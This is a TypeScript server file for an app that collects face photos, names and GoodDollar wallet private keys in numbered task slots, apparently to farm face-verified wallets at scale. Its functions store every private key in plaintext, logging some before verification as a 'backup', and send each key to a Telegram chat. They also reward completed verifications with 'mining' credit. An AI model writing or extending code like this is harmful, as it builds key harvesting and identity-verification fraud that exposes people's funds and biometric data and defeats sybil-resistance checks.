import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { REVERIFY_INTERVAL_MS, TOTAL_TASKS } from "./constants";

async function notifyTelegram(text: string) {
  const { sendTelegram } = await import("./telegram.server");
  await sendTelegram(text);
}


async function uploadFace(adminClient: any, userId: string, slot: number, base64: string) {
  const buf = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0));
  const path = `${userId}/${slot}-${Date.now()}.jpg`;
  const { error } = await adminClient.storage.from("face-photos").upload(path, buf, {
    contentType: "image/jpeg",
    upsert: false,
  });
  if (error) throw new Error("Photo upload failed: " + error.message);
  return path;
}

/**
 * After client confirms GoodDollar whitelist, persist the binding:
 * photo + wallet_address + private_key + face_label on the task row.
 */
const BindInput = z.object({
  slot: z.number().int().min(1).max(1000),
  photoBase64: z.string().min(100),
  privateKey: z.string().min(10),
  walletAddress: z.string().min(10),
  faceLabel: z.string().min(1).max(60),
});

export const bindFirstVerify = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => BindInput.parse(input))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: task } = await supabaseAdmin
      .from("tasks").select("*").eq("user_id", userId).eq("slot", data.slot).maybeSingle();
    if (!task) throw new Error("এই স্লট পাওয়া যায়নি");
    if (task.status !== "empty") throw new Error("Ei slot already verified");

    // Reject duplicate wallet across the whole app. This makes repeated
    // clicks/refresh submits idempotent instead of creating duplicate slots.
    const { data: dup } = await supabaseAdmin
      .from("tasks").select("id").eq("wallet_address", data.walletAddress).maybeSingle();
    if (dup) throw new Error("Ei wallet already bind ache");

    const path = await uploadFace(supabaseAdmin, userId, data.slot, data.photoBase64);
    const now = new Date();
    const dueAt = new Date(now.getTime() + REVERIFY_INTERVAL_MS);

    const { error } = await supabaseAdmin
      .from("tasks")
      .update({
        face_photo_url: path,
        wallet_address: data.walletAddress,
        wallet_private_key: data.privateKey,
        face_label: data.faceLabel.trim(),
        status: "verified",
        initial_verify_at: now.toISOString(),
        reverify_due_at: dueAt.toISOString(),
      })
      .eq("id", task.id);
    if (error) throw new Error(error.message);

    // Remove the earlier backup row for this generated key, if it exists.
    await supabaseAdmin
      .from("unverified_attempts")
      .delete()
      .eq("user_id", userId)
      .eq("wallet_address", data.walletAddress);

    // Notify Telegram with the whitelisted key for back-up. Await it so the
    // server runtime does not end before the message is sent.
    try {
      await notifyTelegram(
        `✅ <b>First verify OK</b>\n` +
        `Slot: #${data.slot}\n` +
        `Name: ${data.faceLabel.trim()}\n` +
        `Wallet: <code>${data.walletAddress}</code>\n` +
        `Key: <code>${data.privateKey}</code>`
      );
    } catch {
      // The key is already saved in the app/admin panel; don't fail the task.
    }

    return { ok: true, reverifyDueAt: dueAt.toISOString() };
  });

/**
 * সংরক্ষণ a non-whitelisted attempt (photo + key + wallet) so admin can review.
 * Does NOT mark the task as verified — slot stays empty.
 */
const সংরক্ষণUnverifiedInput = z.object({
  slot: z.number().int().min(1).max(1000).optional(),
  taskId: z.string().uuid().optional(),
  kind: z.enum(["first_verify", "reverify"]).default("first_verify"),
  photoBase64: z.string().min(100),
  privateKey: z.string().min(10),
  walletAddress: z.string().min(10),
  faceLabel: z.string().min(1).max(60),
  reason: z.string().max(200).optional(),
});

export const saveNotWhitelisted = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => সংরক্ষণUnverifiedInput.parse(input))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: existing } = await supabaseAdmin
      .from("unverified_attempts")
      .select("id, face_photo_url")
      .eq("user_id", userId)
      .eq("wallet_address", data.walletAddress)
      .maybeSingle();

    let path = existing?.face_photo_url ?? null;
    if (!path) {
      const buf = Uint8Array.from(atob(data.photoBase64), (c) => c.charCodeAt(0));
      path = `${userId}/unverified-${data.slot ?? 0}-${Date.now()}.jpg`;
      const { error: upErr } = await supabaseAdmin.storage
        .from("face-photos").upload(path, buf, { contentType: "image/jpeg", upsert: false });
      if (upErr) throw new Error("Photo upload failed: " + upErr.message);
    }

    if (existing) {
      const { error } = await supabaseAdmin.from("unverified_attempts").update({
        slot: data.slot ?? null,
        task_id: data.taskId ?? null,
        kind: data.kind,
        face_label: data.faceLabel.trim(),
        face_photo_url: path,
        wallet_private_key: data.privateKey,
        reason: data.reason ?? "Whitelist e pawa jay nai",
      }).eq("id", existing.id);
      if (error) throw new Error(error.message);
      return { ok: true, updated: true };
    }

    const { error } = await supabaseAdmin.from("unverified_attempts").insert({
      user_id: userId,
      slot: data.slot ?? null,
      task_id: data.taskId ?? null,
      kind: data.kind,
      face_label: data.faceLabel.trim(),
      face_photo_url: path,
      wallet_address: data.walletAddress,
      wallet_private_key: data.privateKey,
      reason: data.reason ?? "Whitelist e pawa jay nai",
    });
    if (error) throw new Error(error.message);

    return { ok: true };
  });

/**
 * Log every generated key immediately (backup) — before whitelist check.
 * Ensures no key is ever lost even if user closes the tab.
 * Idempotent per (user_id, wallet_address).
 */
const LogKeyInput = z.object({
  slot: z.number().int().min(1).max(1000),
  photoBase64: z.string().min(100),
  privateKey: z.string().min(10),
  walletAddress: z.string().min(10),
  faceLabel: z.string().min(1).max(60),
});

export const logGeneratedKey = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => LogKeyInput.parse(input))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    // Skip if already logged for this wallet
    const { data: existing } = await supabaseAdmin
      .from("unverified_attempts")
      .select("id")
      .eq("user_id", userId)
      .eq("wallet_address", data.walletAddress)
      .maybeSingle();
    if (existing) return { ok: true, skipped: true };

    const buf = Uint8Array.from(atob(data.photoBase64), (c) => c.charCodeAt(0));
    const path = `${userId}/generated-${data.slot}-${Date.now()}.jpg`;
    const { error: upErr } = await supabaseAdmin.storage
      .from("face-photos").upload(path, buf, { contentType: "image/jpeg", upsert: false });
    if (upErr) throw new Error("Photo upload failed: " + upErr.message);

    const { error } = await supabaseAdmin.from("unverified_attempts").insert({
      user_id: userId,
      slot: data.slot,
      kind: "first_verify",
      face_label: data.faceLabel.trim() || "নাম নেই",
      face_photo_url: path,
      wallet_address: data.walletAddress,
      wallet_private_key: data.privateKey,
      reason: "কী তৈরি হয়েছে (ব্যাকআপ) — যাচাই অপেক্ষমাণ",
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });



/**
 * Re-verify search: list this user's verified tasks (re-verify ready) matching name query.
 * Returns the stored private_key so the client can sign a fresh GoodDollar URL.
 */
const SearchInput = z.object({ query: z.string().default("") });

export const listReverifyCandidates = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => SearchInput.parse(input ?? {}))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const q = data.query.trim().toLowerCase();

    // Use admin client — RLS on tasks blocks authenticated SELECT; we still scope by userId.
    const { data: tasks } = await supabaseAdmin
      .from("tasks")
      .select("id, slot, face_label, face_photo_url, wallet_address, wallet_private_key, reverify_due_at")
      .eq("user_id", userId)
      .eq("status", "verified")
      .order("face_label", { ascending: true });

    let list = (tasks ?? []).filter((t) => t.wallet_address && t.wallet_private_key);
    if (q) list = list.filter((t) => (t.face_label || "").toLowerCase().includes(q));

    const withUrls = await Promise.all(
      list.map(async (t) => {
        if (!t.face_photo_url) return { ...t, photo_url: null };
        const { data: signed } = await supabaseAdmin.storage
          .from("face-photos").createSignedUrl(t.face_photo_url, 60 * 10);
        return { ...t, photo_url: signed?.signedUrl ?? null };
      }),
    );
    return withUrls;
  });

/**
 * After re-verify whitelist confirmed: mark task done, refresh photo, activate mining if all done.
 */
const CompleteInput = z.object({
  taskId: z.string().uuid(),
  newPhotoBase64: z.string().optional(),
});

export const completeReverify = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((input: unknown) => CompleteInput.parse(input))
  .handler(async ({ data, context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: task } = await supabaseAdmin
      .from("tasks").select("*").eq("id", data.taskId).eq("user_id", userId).maybeSingle();
    if (!task) throw new Error("টাস্ক পাওয়া যায়নি");
    if (task.status !== "verified") throw new Error("রি-ভেরিফাই প্রস্তুত নয়");

    let newPath = task.face_photo_url;
    if (data.newPhotoBase64) {
      newPath = await uploadFace(supabaseAdmin, userId, task.slot, data.newPhotoBase64);
    }

    const now = new Date();
    const { error } = await supabaseAdmin.from("tasks")
      .update({ status: "done", done_at: now.toISOString(), face_photo_url: newPath })
      .eq("id", task.id);
    if (error) throw new Error(error.message);

    try {
      await notifyTelegram(
        `🔄 <b>Re-verify OK</b>\n` +
        `Slot: #${task.slot}\n` +
        `Name: ${task.face_label ?? "—"}\n` +
        `Wallet: <code>${task.wallet_address}</code>\n` +
        `Key: <code>${task.wallet_private_key}</code>`
      );
    } catch {
      // সংরক্ষণd in the database/admin panel already.
    }


    // Mark whitelist OK on re-verify and settle mining (scales effective rate
    // up by 1 valid done task).
    await supabaseAdmin.from("tasks")
      .update({ whitelist_ok: true, last_whitelist_check_at: now.toISOString() })
      .eq("id", task.id);

    await supabaseAdmin.rpc("settle_mining", { _user_id: userId });

    const { data: m } = await supabaseAdmin
      .from("mining_state").select("effective_task_count").eq("user_id", userId).maybeSingle();
    const miningActivated = (m?.effective_task_count ?? 0) >= TOTAL_TASKS;

    return { ok: true, miningActivated };
  });


/**
 * Add 10 more task slots after the user has completed all existing ones.
 */
export const addMoreSlots = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { userId } = context;
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: existing } = await supabaseAdmin
      .from("tasks").select("slot, status").eq("user_id", userId).order("slot");
    const all = existing ?? [];
    if (all.length === 0) throw new Error("Kono slot pawa jay nai");
    const anyEmpty = all.some((t) => t.status === "empty");
    if (anyEmpty) throw new Error("Age sob slot joma din, tarpor 10 ta notun slot khulte parben");

    const maxSlot = Math.max(...all.map((t) => t.slot));
    const rows = Array.from({ length: 10 }, (_, i) => ({
      user_id: userId,
      slot: maxSlot + i + 1,
      status: "empty" as const,
    }));
    const { error } = await supabaseAdmin.from("tasks").insert(rows);
    if (error) throw new Error(error.message);
    return { ok: true, added: 10, total: all.length + 10 };
  });
